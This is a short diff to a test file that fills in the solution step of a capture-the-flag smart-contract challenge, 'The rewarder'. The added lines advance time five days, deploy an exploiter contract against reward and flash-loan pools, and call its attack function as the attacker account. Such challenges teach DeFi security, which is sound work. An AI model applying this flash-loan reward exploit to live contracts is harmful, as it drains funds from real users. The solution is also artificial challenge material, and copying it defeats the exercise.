@@ -61,6 +61,19 @@ describe('[Challenge] The rewarder', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+
+        // Advance time 5 days so that depositors can get rewards
+        await time.increase(time.duration.days(5));
+
+        const TheRewarderExploiter = contract.fromArtifact('TheRewarderExploiter');
+        const exploiterContract = await TheRewarderExploiter.new(
+            this.rewarderPool.address,
+            this.flashLoanPool.address,
+            this.liquidityToken.address,
+            this.rewardToken.address,
+            { from: attacker }
+        );
+        await exploiterContract.attack({ from: attacker });
     });
 
     after(async function () {
